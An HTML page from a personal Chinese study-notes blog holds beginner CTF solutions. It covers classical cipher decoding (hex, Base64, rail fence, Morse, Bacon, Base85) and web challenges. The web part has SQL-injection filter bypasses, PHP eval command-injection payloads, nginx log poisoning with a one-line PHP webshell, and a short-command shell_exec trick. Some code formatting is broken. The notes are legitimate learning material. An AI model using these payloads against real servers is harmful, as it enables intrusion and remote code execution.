@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>萌新 — 📒 笔记博客</title>
+<link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+<nav class="nav">
+  <div class="container">
+    <a href="../../index.html" class="nav-brand"><span class="icon">N</span> 笔记博客</a>
+    <ul class="nav-links">
+      <li><a href="../../index.html">首页</a></li>
+      <li><a href="../../index.html#cat-basic">🖥️ 电脑技巧</a></li>
+      <li><a href="../../index.html#cat-ds">📊 数据结构</a></li>
+      <li><a href="../../index.html#cat-web">🌐 Web 基础</a></li>
+      <li><a href="../../index.html#cat-pikachu">🎯 Pikachu靶场</a></li>
+      <li><a href="../../index.html#cat-ctfshow">🚩 CTF 刷题</a></li>
+    </ul>
+  </div>
+</nav>
+<main class="container">
+  <div class="post-page">
+    <a href="../../index.html" class="back-link">← 返回首页</a>
+    
+    <article>
+      <header class="post-header">
+        <span class="post-cat">🚩 CTF 刷题</span>
+        <h1>萌新</h1>
+        <div class="post-meta">
+          <span>📁 CTF 刷题</span>
+          <span>📄 155 行</span>
+        </div>
+      </header>
+      <div class="post-content">
+        <h1>萌新</h1>
+<h3>密码</h3>
+<ol>
+<li>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</li>
+</ol>
+<p>16进制：hex</p>
+<p>S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=</p>
+<p>包含大写字母、小写字母、数字和符号的字符串，末尾带有等号 <code>=</code>：Base 64</p>
+<p>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</p>
+<p>包含了完整的 <code>KEY{...}</code>格式骨架，但里面的字母顺序是错乱的：栅栏</p>
+<ol>
+<li>“敲几下键盘”->键盘包围</li>
+<li>-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -..  -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. --</li>
+</ol>
+<p>摩斯密码</p>
+<p>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</p>
+<p>英语：摩斯密码很酷但培根更酷</p>
+<p>MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM换成AB</p>
+<p>AABBABABAAABBBABABBAAAAAAABBABAABBA</p>
+<p>培根解密：guowang</p>
+<ol>
+<li>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</li>
+</ol>
+<p>Base 64</p>
+<p>Ao(mgHX^E)ARAnTF(J]f@&lt;6".</p>
+<p>HTML</p>
+<p>Ao(mgHX^E)ARAnTF(J]f@<6".</p>
+<p>存在过多符号：Base 85</p>
+<h3>隐写</h3>
+<ol>
+<li>压缩文件爆破：ARCHPR</li>
+</ol>
+<p>只有数字，且有范围，设置条件</p>
+<ol>
+<li>word隐藏：文件-选项-隐藏文字</li>
+</ol>
+<h3>杂项</h3>
+<ol>
+<li>md5解码https://www.somd5.com/</li>
+<li>winhex打开/记事本打开</li>
+<li>解压需要密码-ARCHPR-所有数字-372000000~372999999</li>
+<li>所有大写字母</li>
+</ol>
+<h3>web</h3>
+<ol>
+<li><strong>注入点</strong>：<code>?id=...</code></li>
+</ol>
+<p><strong>过滤规则</strong>：</p>
+<ul>
+<li><code>preg_match(&quot;/or|\+/i&quot;, $id)</code>：过滤了 <code>or</code>和 <code>+</code>。
+   - <code>intval($id) &gt; 999</code>：限制了传入的值经过整数转换后必须大于 999。</li>
+</ul>
+<p><strong>目标</strong>： <code>&lt;!-- flag in id = 1000 --&gt;</code>，拿到 <code>id=1000</code>的数据。</p>
+<p><strong>重要线索</strong>：代码中有 <code>echo &quot;执行的sql为: $sql&quot;;</code>，这意味着它会把最终执行的 SQL 语句打印出来，我们可以利用报错信息来解题。</p>
+<p>？id=0x3e8</p>
+<p>十六进制<999可以绕过，进入SQL，在SQL里又被转换成1000</p>
+<ol>
+<li>``<code>
+   if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))
+&lt;!--CODEBLOCK_0--&gt;
+   二进制 (Binary)：基于2的数字系统，使用两个符号（0 和 1）。
+   八进制 (Octal)：基于8的数字系统，使用八个符号（0 到 7）。
+   十六进制 (Hexadecimal)：基于16的数字系统，使用十六个符号（0 到 9 ，A 到 F。其中 A 表示10，B 表示11，依此类推，直到 F 表示15）。
+&lt;!--CODEBLOCK_1--&gt;
+   &lt;?php
+   # flag in config.php
+   include(&quot;config.php&quot;);
+   if(isset($_GET['c'])){
+           $c = $_GET['c'];
+           if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c)){
+                   eval($c);
+           }else{
+               die(&quot;cmd error&quot;);
+           }
+   }else{
+           highlight_file(__FILE__);
+   }
+   ?&gt;
+   
+&lt;!--CODEBLOCK_2--&gt;
+
+   cat不能用：用**tac**
+
+   ?c=passthru('tac config.php');
+
+8. </code>`<code>
+   &lt;?php
+   # flag in config.php
+   include(&quot;config.php&quot;); if(isset($_GET['c'])){
+   $c = $_GET['c'];     if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c)){         eval($c);     
+   }else{
+   die(&quot;cmd error&quot;);     
+   }
+   }else{  
+   highlight_file(__FILE__);
+   } 
+   ?&gt; 
+</code>`<code>
+
+   config.php被ban了：用省略,输入：
+
+   ?c=passthru('tac conf*');
+
+   * passthru()函数：PHP 内置函数，用于**执行外部系统命令并直接输出命令结果**。
+
+   * tac命令：**反向输出**文件内容（与 cat类似，但 cat正序、tac倒序）。
+
+   * **conf***通配符：匹配所有**以 conf开头**的文件[^例如 config.php、config.inc.php等目标配置文件]
+
+9. 对分号、file的过滤
+
+   无法用分号闭合，可以考虑用**?&gt;**直接闭合php代码文件。
+
+   PHP 代码块通过 </code><?php ... ?><code>标识范围
+
+   结合通配符绕过构造url：?c=passthru('more confi*')?&gt;，F12查看源码即可。
+
+10. **PHP 变量作用域** 和 **标签闭合**：?c=echo $flag?&gt;
+
+    </code>echo $flag<code>：直接输出变量 </code>$flag<code>的值（也就是真正的 flag 字符串）。
+
+    </code>?><code>：这是 PHP 的结束标签。它的作用是**切断后续代码**。在这里，它防止了如果后面有任何多余字符（比如 URL 里的 </code>&<code>或者其他参数）被当成 PHP 代码解析而导致报错。
+
+    过滤 $后面跟着 .、;、file、php或 config的情况。
+
+    而 $flag,后面是 f，不在黑名单里，所以正则匹配失败，代码顺利进入 eval执行。
+
+    既然文件已经被包含，就直接读变量，而不是去读文件
+
+11. **nginx**中间件（F12-network-F5-document-header-response headers-Server: nginx/Tengine）
+
+    nginx中间件的日志文件都在/var/log/nginx/access.log里。
+
+    输入： /?c=**/var/log/nginx/access.log**
+
+    在User-Agent塞入&lt;?php...?&gt;
+    
+    一句话木马：&lt;?php @eval($_POST['aaa']);?&gt;
+    
+    中国蚁剑连接：36d
+    
+    改为&lt;?php system('tac 36d.php');?&gt;
+
+12. </code>if(strlen($_GET[1])<4){
+         echo shell_exec($_GET[1]);<code>
+    </code>}<code>
+
+    GET参数1的长度必须小于 4-&gt; shell 执行并输出结果[^像 nl flag.php、cat flag 这种能读文件的命令，都≥4，无法直接输入。]
+
+    1. ?1=&gt;nl创建一个名为nl的空文件（3个字符）
+
+       在 Shell ，&gt; 是输出重定向符。如果前面没有命令，&gt;nl 的意思就是“把空的内容重定向到文件 nl”，效果就是 创建一个空文件，名字叫 nl
+
+    2. ?1=ls看目录
+
+    3. ?1=让shell拼出命令
+
+       Shell 会把 * 展开为当前目录下所有普通文件名，按字母顺序用空格连接。
+
+       第一个词 nl 被当作命令，后面的词（z.php 等）被当作这个命令的参数
+
+       </code>nl z.php`</li>
+</ol>
+<p>nl ： 带行号显示文件内容</p>
+
+      </div>
+    </article>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>📒 个人学习笔记 · Powered by plain HTML & CSS</p>
+  </div>
+</footer>
+</body>
+</html>
